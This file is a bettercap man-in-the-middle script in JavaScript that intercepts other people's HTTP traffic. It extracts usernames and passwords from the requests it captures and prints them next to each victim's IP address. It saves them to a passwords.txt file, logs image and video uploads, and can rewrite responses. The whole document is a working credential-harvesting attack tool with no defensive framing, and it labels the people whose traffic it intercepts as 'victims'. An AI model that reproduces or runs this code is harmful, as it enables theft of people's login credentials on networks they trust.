var victims = {}

function logMessage(message) {
    log("\033[32m" + message + "\033[0m");
}

function onRequest(req, res) {
    var ip = req.Client.IP;
    var headers = req.Headers.replace(/\r\n$/g, "").split("\r\n");
    var credentials = {};
    var foundImage = false;
    var foundVideo = false;
    
    // Look for username and password in the request
    for (var i = 0; i < headers.length; i++) {
        if (headers[i].includes("username=")) {
            credentials.username = headers[i].replace(/.*username=/, "").split('&')[0];
        }
        if (headers[i].includes("password=")) {
            credentials.password = headers[i].replace(/.*password=/, "").split('&')[0];
        }
    }

    // If credentials are found, log them
    if (credentials.username && credentials.password) {
        logMessage("[+] Credentials Captured - IP: " + ip + " | Username: " + credentials.username + " | Password: " + credentials.password);
        writeFile("/usr/local/share/bettercap/ui/captured-data/passwords.txt", "IP: " + ip + " | Username: " + credentials.username + " | Password: " + credentials.password + "\n", true);
    }

    // Look for file uploads (images, videos)
    if (req.Headers.includes("multipart/form-data")) {
        if (req.Body.includes("image")) {
            foundImage = true;
            logMessage("[*] Image Upload Detected from " + ip);
            // You can handle image storage here
            writeFile("/usr/local/share/bettercap/ui/captured-data/uploads.txt", "Image Upload Detected from " + ip + "\n", true);
        }
        if (req.Body.includes("video")) {
            foundVideo = true;
            logMessage("[*] Video Upload Detected from " + ip);
            // You can handle video storage here
            writeFile("/usr/local/share/bettercap/ui/captured-data/uploads.txt", "Video Upload Detected from " + ip + "\n", true);
        }
    }

    // Optionally modify the response
    if (foundImage || foundVideo) {
        res.Body = "Thank you for uploading!";
    }
}

function onResponse(req, res) {
    logMessage("Response from IP: " + req.Client.IP);
    // You can log more details or manipulate the response if needed.
}
